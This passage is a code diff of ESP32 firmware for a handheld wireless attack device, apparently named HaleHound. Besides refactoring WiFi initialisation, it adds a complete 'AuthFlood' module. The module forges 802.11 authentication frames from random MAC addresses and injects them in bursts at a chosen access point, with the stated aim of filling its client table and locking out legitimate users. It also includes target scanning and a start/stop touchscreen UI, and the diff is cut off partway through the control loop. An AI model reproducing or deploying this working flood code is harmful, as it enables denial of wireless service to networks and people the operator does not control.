@@ -311,16 +311,59 @@ void setup() {
     currentChannel = preferences.getUInt("channel", 1);
     preferences.end();
 
-    // Initialize WiFi in promiscuous mode
-    nvs_flash_init();
-    tcpip_adapter_init();
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
-    ESP_ERROR_CHECK(esp_wifi_start());
+    // Full teardown first — handles ANY prior WiFi state (promiscuous, APSTA, STA, etc.)
+    wifiCleanup();
 
-    // Set initial channel
+    // Initialize WiFi in promiscuous mode with error checking + retry
+    nvs_flash_init();
+    esp_err_t err;
+    for (int attempt = 0; attempt < 3; attempt++) {
+        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+        err = esp_wifi_init(&cfg);
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[PKTMON] esp_wifi_init failed (0x%x), retry %d\n", err, attempt);
+            #endif
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+
+        esp_wifi_set_storage(WIFI_STORAGE_RAM);
+        err = esp_wifi_set_mode(WIFI_MODE_NULL);
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[PKTMON] set_mode NULL failed (0x%x), retry %d\n", err, attempt);
+            #endif
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+
+        err = esp_wifi_start();
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[PKTMON] esp_wifi_start failed (0x%x), retry %d\n", err, attempt);
+            #endif
+            esp_wifi_stop();
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+
+        break;  // Success
+    }
+
+    if (err != ESP_OK) {
+        #if CYD_DEBUG
+        Serial.println("[PKTMON] FATAL: WiFi init failed after 3 attempts");
+        #endif
+        return;
+    }
+
+    delay(50);
+
+    // Set initial channel and enable promiscuous capture
     esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_promiscuous_rx_cb(&wifiPromiscuousCB);
     esp_wifi_set_promiscuous(true);
@@ -772,23 +815,40 @@ void setup() {
     // Skip hardware init if already done
     if (initialized) return;
 
-    // Safe teardown of any stale WiFi state before reinit
-    // Prevents ESP_ERR_NO_MEM (257) crash from double esp_wifi_init()
-    WiFi.mode(WIFI_OFF);
-    delay(50);
-    esp_wifi_stop();
-    esp_wifi_deinit();
-    delay(50);
+    // Full teardown first — handles ANY prior WiFi state
+    wifiCleanup();
 
-    // Initialize WiFi in AP mode for TX
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    ESP_ERROR_CHECK(esp_wifi_start());
+    // Initialize WiFi in AP mode for TX with retry
+    esp_err_t err;
+    for (int attempt = 0; attempt < 3; attempt++) {
+        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+        err = esp_wifi_init(&cfg);
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[BEACON] esp_wifi_init failed (0x%x), retry %d\n", err, attempt);
+            #endif
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+        esp_wifi_set_storage(WIFI_STORAGE_RAM);
+        err = esp_wifi_set_mode(WIFI_MODE_AP);
+        if (err != ESP_OK) { esp_wifi_deinit(); delay(100); continue; }
+        err = esp_wifi_start();
+        if (err != ESP_OK) { esp_wifi_stop(); esp_wifi_deinit(); delay(100); continue; }
+        break;
+    }
+
+    if (err != ESP_OK) {
+        #if CYD_DEBUG
+        Serial.println("[BEACON] FATAL: WiFi init failed after 3 attempts");
+        #endif
+        return;
+    }
+
     esp_wifi_set_max_tx_power(82);       // Max TX power: 20.5 dBm
     esp_wifi_set_ps(WIFI_PS_NONE);       // Disable power saving for max throughput
-    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
+    esp_wifi_set_promiscuous(true);
 
     esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
 
@@ -1060,30 +1120,81 @@ void cleanup() {
 // ═══════════════════════════════════════════════════════════════════════════
 
 void wifiPromiscuousInit() {
+    wifiCleanup();
     nvs_flash_init();
-    tcpip_adapter_init();
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
-    ESP_ERROR_CHECK(esp_wifi_start());
+    esp_err_t err;
+    for (int attempt = 0; attempt < 3; attempt++) {
+        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+        err = esp_wifi_init(&cfg);
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[WIFI] promiscuousInit: init failed (0x%x), retry %d\n", err, attempt);
+            #endif
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+        esp_wifi_set_storage(WIFI_STORAGE_RAM);
+        err = esp_wifi_set_mode(WIFI_MODE_NULL);
+        if (err != ESP_OK) { esp_wifi_deinit(); delay(100); continue; }
+        err = esp_wifi_start();
+        if (err != ESP_OK) { esp_wifi_stop(); esp_wifi_deinit(); delay(100); continue; }
+        break;
+    }
+    #if CYD_DEBUG
+    if (err != ESP_OK) Serial.println("[WIFI] promiscuousInit: FAILED after 3 attempts");
+    #endif
 }
 
 void wifiAPInit() {
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    ESP_ERROR_CHECK(esp_wifi_start());
-    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
+    wifiCleanup();
+    esp_err_t err;
+    for (int attempt = 0; attempt < 3; attempt++) {
+        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+        err = esp_wifi_init(&cfg);
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[WIFI] APInit: init failed (0x%x), retry %d\n", err, attempt);
+            #endif
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+        esp_wifi_set_storage(WIFI_STORAGE_RAM);
+        err = esp_wifi_set_mode(WIFI_MODE_AP);
+        if (err != ESP_OK) { esp_wifi_deinit(); delay(100); continue; }
+        err = esp_wifi_start();
+        if (err != ESP_OK) { esp_wifi_stop(); esp_wifi_deinit(); delay(100); continue; }
+        esp_wifi_set_promiscuous(true);
+        break;
+    }
+    #if CYD_DEBUG
+    if (err != ESP_OK) Serial.println("[WIFI] APInit: FAILED after 3 attempts");
+    #endif
 }
 
 void wifiCleanup() {
+    // Full radio teardown — call BEFORE any WiFi module init
+    // Handles any prior state: promiscuous, STA, AP, APSTA, raw ESP-IDF
+
+    // 1. Kill promiscuous mode if it was on
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
+
+    // 2. Arduino-level shutdown (sets internal flags so Arduino doesn't fight ESP-IDF)
     WiFi.disconnect(true);
     WiFi.mode(WIFI_OFF);
     delay(50);
+
+    // 3. ESP-IDF level teardown — stop and deinit regardless of current state
+    //    These may return errors if already stopped/deinited — that's fine
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    delay(100);
+
+    #if CYD_DEBUG
+    Serial.println("[WIFI] Full radio teardown complete");
+    #endif
 }
 
 
@@ -2064,6 +2175,805 @@ void cleanup() {
 }
 
 }  // namespace Deauther
+
+
+// ═══════════════════════════════════════════════════════════════════════════
+// AUTH FLOOD - 802.11 Authentication Frame Flood Attack
+// Sends fake authentication requests from random MACs to overwhelm AP
+// client association table, preventing legitimate clients from connecting.
+// Uses same raw ESP-IDF APSTA injection as Deauther.
+// ═══════════════════════════════════════════════════════════════════════════
+
+namespace AuthFlood {
+
+// 802.11 Authentication frame template (30 bytes)
+static uint8_t auth_frame[30] = {
+    0xB0, 0x00,                         // type/subtype: Authentication
+    0x00, 0x00,                         // duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // destination (AP BSSID)
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (random MAC)
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP BSSID)
+    0x00, 0x00,                         // fragment & sequence
+    0x00, 0x00,                         // auth algorithm: Open System
+    0x01, 0x00,                         // auth sequence: Request
+    0x00, 0x00                          // status code: Success
+};
+
+// State
+static bool initialized = false;
+static bool exitRequested = false;
+static bool attackRunning = false;
+static bool inAttackMode = false;
+
+static uint32_t packetCount = 0;
+static uint32_t successCount = 0;
+static uint32_t uniqueMACs = 0;
+static unsigned long attackStartTime = 0;
+
+// Target AP
+static wifi_ap_record_t targetAp;
+static bool targetSelected = false;
+static int selectedIdx = -1;
+
+// Scan results
+static wifi_ap_record_t* afApList = nullptr;
+static int afNetworkCount = 0;
+static int afCurrentPage = 0;
+static int afHighlightIdx = 0;
+static const int afPerPage = 12;
+
+// Skull spinner (8-skull row with color wave — matches Deauther style)
+static int skullFrame = 0;
+static const unsigned char* skullIcons[] = {
+    bitmap_icon_skull_wifi,
+    bitmap_icon_skull_bluetooth,
+    bitmap_icon_skull_jammer,
+    bitmap_icon_skull_subghz,
+    bitmap_icon_skull_ir,
+    bitmap_icon_skull_tools,
+    bitmap_icon_skull_setting,
+    bitmap_icon_skull_about
+};
+static const int numSkulls = 8;
+
+// Debounce guard — prevents state transition bleed-through
+// (BTN_STATE_PRESSED persists for up to 500ms, causing double-fire)
+static unsigned long lastStateChange = 0;
+static const unsigned long STATE_CHANGE_COOLDOWN = 300;
+
+// ═══════════════════════════════════════════════════════════════════════════
+// RAW ESP-IDF WIFI INIT (same pattern as Deauther)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static bool afInitAttackMode(uint8_t targetChannel) {
+    // Full teardown first — handles ANY prior WiFi state cleanly
+    wifiCleanup();
+    inAttackMode = false;
+
+    // Full init cycle with retry — each attempt does complete teardown→init
+    for (int attempt = 0; attempt < 3; attempt++) {
+        #if CYD_DEBUG
+        Serial.printf("[AUTHFLOOD] Init attempt %d/3 (CH%d)\n", attempt + 1, targetChannel);
+        #endif
+
+        // Fresh init
+        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+        esp_err_t err = esp_wifi_init(&cfg);
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[AUTHFLOOD] esp_wifi_init failed: 0x%x\n", err);
+            #endif
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+
+        esp_wifi_set_storage(WIFI_STORAGE_RAM);
+        err = esp_wifi_set_mode(WIFI_MODE_APSTA);
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[AUTHFLOOD] APSTA mode failed: 0x%x\n", err);
+            #endif
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+
+        err = esp_wifi_start();
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[AUTHFLOOD] wifi_start failed: 0x%x\n", err);
+            #endif
+            esp_wifi_stop();
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+
+        // Let the radio fully settle after start
+        delay(100);
+
+        // Configure hidden AP — required for esp_wifi_80211_tx(WIFI_IF_AP, ...)
+        wifi_config_t ap_config = {};
+        strncpy((char*)ap_config.ap.ssid, "HaleHound", sizeof(ap_config.ap.ssid));
+        ap_config.ap.ssid_len = 9;
+        ap_config.ap.ssid_hidden = 1;
+        ap_config.ap.max_connection = 0;
+        ap_config.ap.authmode = WIFI_AUTH_OPEN;
+        ap_config.ap.beacon_interval = 60000;
+        esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+
+        esp_wifi_set_max_tx_power(82);
+        esp_wifi_set_ps(WIFI_PS_NONE);
+
+        // Let AP interface fully come up
+        delay(100);
+
+        // Set TARGET channel BEFORE test frame — verify TX on actual attack channel
+        err = esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+        if (err != ESP_OK) {
+            #if CYD_DEBUG
+            Serial.printf("[AUTHFLOOD] Channel set CH%d failed: 0x%x\n", targetChannel, err);
+            #endif
+            esp_wifi_stop();
+            esp_wifi_deinit();
+            delay(100);
+            continue;
+        }
+        delay(50);  // Let channel switch settle
+
+        // TEST FRAME on target channel — verify the radio actually transmits
+        uint8_t test_frame[30];
+        memcpy(test_frame, auth_frame, sizeof(test_frame));
+        memset(&test_frame[4], 0xFF, 6);   // Broadcast destination
+        for (int k = 0; k < 6; k++) test_frame[10 + k] = random(0, 256);
+        test_frame[10] = (test_frame[10] & 0xFE) | 0x02;
+        memset(&test_frame[16], 0xFF, 6);  // Broadcast BSSID
+
+        err = esp_wifi_80211_tx(WIFI_IF_AP, test_frame, sizeof(test_frame), false);
+        if (err == ESP_OK) {
+            inAttackMode = true;
+            #if CYD_DEBUG
+            Serial.printf("[AUTHFLOOD] APSTA ready — test TX confirmed on CH%d\n", targetChannel);
+            #endif
+            return true;
+        }
+
+        #if CYD_DEBUG
+        Serial.printf("[AUTHFLOOD] Test frame TX failed: 0x%x, retry\n", err);
+        #endif
+
+        // Full teardown and try again
+        esp_wifi_stop();
+        esp_wifi_deinit();
+        delay(100);
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[AUTHFLOOD] FATAL: Radio init failed after 3 attempts");
+    #endif
+    return false;
+}
+
+static void afExitAttackMode() {
+    if (!inAttackMode) return;
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    delay(50);
+    inAttackMode = false;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// FRAME INJECTION
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void generateRandomMAC(uint8_t* mac) {
+    for (int i = 0; i < 6; i++) {
+        mac[i] = random(0, 256);
+    }
+    mac[0] &= 0xFE;  // Clear multicast bit
+    mac[0] |= 0x02;  // Set locally administered bit
+}
+
+static void sendAuthFrame() {
+    // Set destination + BSSID to target AP
+    memcpy(&auth_frame[4], targetAp.bssid, 6);
+    memcpy(&auth_frame[16], targetAp.bssid, 6);
+
+    // Random source MAC
+    uint8_t randMac[6];
+    generateRandomMAC(randMac);
+    memcpy(&auth_frame[10], randMac, 6);
+
+    // Random sequence number
+    auth_frame[22] = random(0, 256);
+    auth_frame[23] = random(0, 16);
+
+    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, auth_frame, sizeof(auth_frame), false);
+    packetCount++;
+    if (res == ESP_OK) {
+        successCount++;
+        uniqueMACs++;
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// UI DRAWING
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void drawAfIconBar() {
+    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
+    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
+    tft.drawBitmap(10, 20, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
+    tft.drawBitmap(210, 20, bitmap_icon_undo, 16, 16, HALEHOUND_MAGENTA);
+    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
+}
+
+static void drawAfTitle() {
+    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);
+    drawGlitchTitle(58, "AUTHFLOOD");
+    tft.drawLine(0, 62, SCREEN_WIDTH, 62, HALEHOUND_HOTPINK);
+}
+
+// Scan screen - network list
+static void drawScanScreen() {
+    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, HALEHOUND_BLACK);
+
+    if (afNetworkCount == 0) {
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(10, 100);
+        tft.print("[*] Scanning for networks...");
+        return;
+    }
+
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_VIOLET);
+    tft.setCursor(5, 67);
+    tft.printf("NETWORKS: %d  (tap to select)", afNetworkCount);
+
+    int y = 80;
+    int startIdx = afCurrentPage * afPerPage;
+    for (int i = 0; i < afPerPage && startIdx + i < afNetworkCount; i++) {
+        int idx = startIdx + i;
+        wifi_ap_record_t& ap = afApList[idx];
+
+        if (idx == afHighlightIdx) {
+            tft.fillRect(0, y - 2, SCREEN_WIDTH, 14, HALEHOUND_DARK);
+            tft.setTextColor(HALEHOUND_HOTPINK);
+        } else {
+            tft.setTextColor(HALEHOUND_MAGENTA);
+        }
+
+        tft.setCursor(5, y);
+        char ssidBuf[18];
+        strncpy(ssidBuf, (const char*)ap.ssid, 17);
+        ssidBuf[17] = '\0';
+        tft.print(ssidBuf);
+
+        tft.setCursor(130, y);
+        tft.printf("CH%d", ap.primary);
+
+        tft.setCursor(165, y);
+        tft.printf("%ddB", ap.rssi);
+
+        // Encryption indicator
+        tft.setCursor(210, y);
+        tft.print(ap.authmode == WIFI_AUTH_OPEN ? "OPEN" : "ENC");
+
+        y += 14;
+    }
+
+    // Page indicator
+    int totalPages = (afNetworkCount + afPerPage - 1) / afPerPage;
+    tft.setTextColor(HALEHOUND_GUNMETAL);
+    tft.setCursor(5, SCREEN_HEIGHT - 12);
+    tft.printf("Page %d/%d  SELECT=Attack  L/R=Page", afCurrentPage + 1, totalPages);
+}
+
+// Draw START/STOP button — HaleHound themed, touchable
+static void drawActionButton(bool running) {
+    const int btnX = 20;
+    const int btnY = 100;
+    const int btnW = 200;
+    const int btnH = 34;
+
+    // Dark fill, hotpink/magenta border
+    uint16_t borderColor = running ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
+    tft.fillRoundRect(btnX, btnY, btnW, btnH, 5, HALEHOUND_DARK);
+    tft.drawRoundRect(btnX, btnY, btnW, btnH, 5, borderColor);
+    tft.drawRoundRect(btnX + 1, btnY + 1, btnW - 2, btnH - 2, 4, borderColor);
+
+    // Flanking skull icons
+    tft.drawBitmap(btnX + 6, btnY + 9, bitmap_icon_skull_wifi, 16, 16, borderColor);
+    tft.drawBitmap(btnX + btnW - 22, btnY + 9, bitmap_icon_skull_wifi, 16, 16, borderColor);
+
+    // Button text (size 2)
+    tft.setTextSize(2);
+    if (running) {
+        tft.setTextColor(HALEHOUND_HOTPINK);
+        tft.setCursor(btnX + 32, btnY + 9);
+        tft.print("STOP FLOOD");
+    } else {
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(btnX + 26, btnY + 9);
+        tft.print("START FLOOD");
+    }
+    tft.setTextSize(1);
+}
+
+// Attack screen — full layout: target → button → skull → stats
+static void drawAttackScreen() {
+    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, HALEHOUND_BLACK);
+
+    // Target SSID
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_VIOLET);
+    tft.setCursor(5, 68);
+    tft.print("TARGET: ");
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    char ssidBuf[22];
+    strncpy(ssidBuf, (const char*)targetAp.ssid, 21);
+    ssidBuf[21] = '\0';
+    tft.print(ssidBuf);
+
+    // Channel + BSSID
+    tft.setTextColor(HALEHOUND_VIOLET);
+    tft.setCursor(5, 82);
+    tft.printf("CH: %d  BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+               targetAp.primary,
+               targetAp.bssid[0], targetAp.bssid[1], targetAp.bssid[2],
+               targetAp.bssid[3], targetAp.bssid[4], targetAp.bssid[5]);
+
+    // Separator
+    tft.drawLine(5, 95, SCREEN_WIDTH - 5, 95, HALEHOUND_DARK);
+
+    // START/STOP button
+    drawActionButton(attackRunning);
+
+    // Separator below button
+    tft.drawLine(5, 140, SCREEN_WIDTH - 5, 140, HALEHOUND_DARK);
+
+    if (!attackRunning) {
+        // Standby skull — static, gunmetal
+        int skullX = SCREEN_WIDTH / 2 - 16;
+        tft.drawBitmap(skullX, 150, skullIcons[0], 32, 32, HALEHOUND_GUNMETAL);
+
+        // Standby status
+        drawGlitchStatus(190, "STANDBY", HALEHOUND_GUNMETAL);
+
+        // Stats area — show zeros
+        tft.setTextColor(HALEHOUND_GUNMETAL);
+        tft.setCursor(10, 215);
+        tft.print("PACKETS: 0");
+        tft.setCursor(140, 215);
+        tft.print("SUCCESS: 0");
+
+        tft.setCursor(10, 233);
+        tft.print("FAKE MACs: 0");
+        tft.setCursor(140, 233);
+        tft.print("TIME: 0m00s");
+
+        tft.setCursor(10, 251);
+        tft.print("RATE: 0 pkt/s");
+        tft.setCursor(140, 251);
+        tft.print("HIT: 0.0%");
+
+        tft.setCursor(10, 269);
+        tft.print("BURST: 10 frames/cycle");
+
+        // Footer
+        tft.drawLine(5, 290, SCREEN_WIDTH - 5, 290, HALEHOUND_DARK);
+        tft.setTextColor(HALEHOUND_GUNMETAL);
+        tft.setCursor(5, SCREEN_HEIGHT - 16);
+        tft.print("SELECT=Start  BACK=Return");
+    }
+}
+
+static void updateAttackDisplay() {
+    // Swell phase — cycles 0→7, drives skull color + FLOODING pulse
+    static int swellPhase = 0;
+    swellPhase = (swellPhase + 1) % 8;
+
+    // Clear skull + stats area (preserve target info and button)
+    tft.fillRect(0, 141, SCREEN_WIDTH, 155, HALEHOUND_BLACK);
+
+    // Rotating skull — color pulses with swell phase
+    int skullX = SCREEN_WIDTH / 2 - 16;
+    skullFrame = (skullFrame + 1) % numSkulls;
+
+    // Skull color follows swell: gunmetal → violet → magenta → hotpink → bright → back
+    uint16_t skullColor;
+    switch (swellPhase) {
+        case 0: skullColor = HALEHOUND_VIOLET;   break;
+        case 1: skullColor = HALEHOUND_MAGENTA;  break;
+        case 2: skullColor = HALEHOUND_HOTPINK;  break;
+        case 3: skullColor = 0xFFFF;             break;  // Peak white
+        case 4: skullColor = HALEHOUND_HOTPINK;  break;
+        case 5: skullColor = HALEHOUND_MAGENTA;  break;
+        case 6: skullColor = HALEHOUND_VIOLET;   break;
+        case 7: skullColor = HALEHOUND_GUNMETAL; break;
+        default: skullColor = HALEHOUND_HOTPINK; break;
+    }
+    tft.drawBitmap(skullX, 150, skullIcons[skullFrame], 32, 32, skullColor);
+
+    // FLOODING swell — text pulses through color cycle like injection pressure
+    // Nosifer font at 10pt, color rides the swell wave
+    uint16_t floodColor;
+    switch (swellPhase) {
+        case 0: floodColor = HALEHOUND_GUNMETAL; break;  // Dim — building pressure
+        case 1: floodColor = HALEHOUND_VIOLET;   break;  // Rising
+        case 2: floodColor = HALEHOUND_MAGENTA;  break;  // Swelling
+        case 3: floodColor = HALEHOUND_HOTPINK;  break;  // Peak injection
+        case 4: floodColor = 0xFFFF;             break;  // BURST — white flash
+        case 5: floodColor = HALEHOUND_HOTPINK;  break;  // Fading
+        case 6: floodColor = HALEHOUND_MAGENTA;  break;  // Cooling
+        case 7: floodColor = HALEHOUND_VIOLET;   break;  // Reset
+        default: floodColor = HALEHOUND_HOTPINK; break;
+    }
+
+    // Draw FLOODING with swell color (manual — can't use drawGlitchStatus for dynamic color)
+    tft.setFreeFont(&Nosifer_Regular10pt7b);
+    tft.setTextColor(floodColor, TFT_BLACK);
+    int floodW = tft.textWidth("FLOODING");
+    int floodX = (SCREEN_WIDTH - floodW) / 2;
+    if (floodX < 0) floodX = 0;
+    tft.setCursor(floodX, 190);
+    tft.print("FLOODING");
+    tft.setFreeFont(NULL);
+
+    // ── Stats spread across full width ──
+    tft.setTextSize(1);
+
+    // Row 1: Packets + Success
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(10, 215);
+    tft.printf("PACKETS: %lu", (unsigned long)packetCount);
+    tft.setCursor(140, 215);
+    tft.printf("SUCCESS: %lu", (unsigned long)successCount);
+
+    // Row 2: Fake MACs + Elapsed time
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(10, 233);
+    tft.printf("FAKE MACs: %lu", (unsigned long)uniqueMACs);
+    unsigned long elapsed = (millis() - attackStartTime) / 1000;
+    tft.setCursor(140, 233);
+    tft.printf("TIME: %lum%02lus", elapsed / 60, elapsed % 60);
+
+    // Row 3: Rate + Hit percentage
+    float rate = (elapsed > 0) ? (float)packetCount / (float)elapsed : 0;
+    tft.setTextColor(HALEHOUND_BRIGHT);
+    tft.setCursor(10, 251);
+    tft.printf("RATE: %.0f pkt/s", rate);
+
+    float pct = (packetCount > 0) ? ((float)successCount / (float)packetCount * 100.0f) : 0;
+    tft.setCursor(140, 251);
+    tft.printf("HIT: %.1f%%", pct);
+
+    // Row 4: Burst + Channel
+    tft.setTextColor(HALEHOUND_VIOLET);
+    tft.setCursor(10, 269);
+    tft.printf("BURST: 10 frames/cycle");
+    tft.setCursor(140, 269);
+    tft.printf("CH: %d", targetAp.primary);
+
+    // Footer
+    tft.drawLine(5, 290, SCREEN_WIDTH - 5, 290, HALEHOUND_DARK);
+    tft.setTextColor(HALEHOUND_GUNMETAL);
+    tft.setCursor(5, SCREEN_HEIGHT - 16);
+    tft.print("SELECT=Stop  BACK=Stop & Exit");
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// SCANNING
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void afScanNetworks() {
+    if (inAttackMode) afExitAttackMode();
+
+    WiFi.mode(WIFI_STA);
+    delay(100);
+
+    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, HALEHOUND_BLACK);
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(10, 100);
+    tft.print("[*] Scanning for networks...");
+
+    int n = WiFi.scanNetworks(false, true);
+
+    if (afApList) { free(afApList); afApList = nullptr; }
+    afNetworkCount = n;
+
+    if (n > 0) {
+        afApList = (wifi_ap_record_t*)malloc(n * sizeof(wifi_ap_record_t));
+        if (afApList) {
+            memset(afApList, 0, n * sizeof(wifi_ap_record_t));
+            // Populate from Arduino WiFi API (ESP-IDF records already consumed by Arduino layer)
+            for (int i = 0; i < n; i++) {
+                String ssid = WiFi.SSID(i);
+                strncpy((char*)afApList[i].ssid, ssid.c_str(), 32);
+                afApList[i].ssid[32] = '\0';
+                afApList[i].rssi = WiFi.RSSI(i);
+                afApList[i].primary = WiFi.channel(i);
+                afApList[i].authmode = (wifi_auth_mode_t)WiFi.encryptionType(i);
+                uint8_t* bssid = WiFi.BSSID(i);
+                if (bssid) memcpy(afApList[i].bssid, bssid, 6);
+            }
+            // Sort by RSSI descending
+            for (int i = 0; i < n - 1; i++) {
+                for (int j = i + 1; j < n; j++) {
+                    if (afApList[j].rssi > afApList[i].rssi) {
+                        wifi_ap_record_t tmp = afApList[i];
+                        afApList[i] = afApList[j];
+                        afApList[j] = tmp;
+                    }
+                }
+            }
+        }
+    }
+
+    WiFi.mode(WIFI_OFF);
+    delay(50);
+
+    afCurrentPage = 0;
+    afHighlightIdx = 0;
+    drawScanScreen();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// SETUP AND LOOP
+// ═══════════════════════════════════════════════════════════════════════════
+
+void setup() {
+    if (initialized) return;
+
+    #if CYD_DEBUG
+    Serial.println("[AUTHFLOOD] Initializing...");
+    #endif
+
+    exitRequested = false;
+    attackRunning = false;
+    targetSelected = false;
+    packetCount = 0;
+    successCount = 0;
+    uniqueMACs = 0;
+    afNetworkCount = 0;
+    afApList = nullptr;
+
+    tft.fillScreen(HALEHOUND_BLACK);
+    drawStatusBar();
+    drawAfIconBar();
+    drawAfTitle();
+
+    initialized = true;
+    afScanNetworks();
+}
+
+void loop() {
+    if (!initialized) return;
+
+    touchButtonsUpdate();
+    unsigned long now = millis();
+
+    // Icon bar touch (back / rescan)
+    static unsigned long lastTap = 0;
+    if (now - lastTap > 200) {
+        uint16_t tx, ty;
+        if (getTouchPoint(&tx, &ty)) {
+            if (ty >= 20 && ty <= 36) {
+                if (tx < 40) {  // Back — go to scan screen first, then exit
+                    if (attackRunning) {
+                        attackRunning = false;
+                        afExitAttackMode();
+                    }
+                    if (targetSelected) {
+                        targetSelected = false;
+                        lastStateChange = now;
+                        afScanNetworks();
+                    } else {
+                        exitRequested = true;
+                    }
+                    lastTap = now;
+                    return;
+                }
+                if (tx >= 200) {  // Rescan
+                    if (attackRunning) {
+                        attackRunning = false;
+                        afExitAttackMode();
+                    }
+                    targetSelected = false;
+                    lastStateChange = now;
+                    afScanNetworks();
+                    lastTap = now;
+                    return;
+                }
+            }
+
+            // Touch the START/STOP button area (y=100..134, x=20..220)
+            if (targetSelected && ty >= 100 && ty <= 134 && tx >= 20 && tx <= 220) {
+                if (now - lastStateChange > STATE_CHANGE_COOLDOWN) {
+                    if (!attackRunning) {
+                        // Start attack via touch
+                        if (!afInitAttackMode(targetAp.primary)) {
+                            tft.fillRect(10, 270, 220, 12, HALEHOUND_BLACK);
+                            tft.setTextColor(HALEHOUND_HOTPINK);
+                            tft.setCursor(10, 270);
+                            tft.print("RADIO INIT FAILED - TRY AGAIN");
+                            lastTap = now;
+                            return;
+                        }
+                        attackRunning = true;
+                        packetCount = 0;
+                        successCount = 0;
+                        uniqueMACs = 0;
+                        attackStartTime = now;
+                        lastStateChange = now;
+                        drawActionButton(true);
+                        #if CYD_DEBUG
+                        Serial.printf("[AUTHFLOOD] Attack started (touch) on CH%d %s\n",
+                                      targetAp.primary, targetAp.ssid);
+                        #endif
+                    } else {
+                        // Stop attack via touch
+                        attackRunning = false;
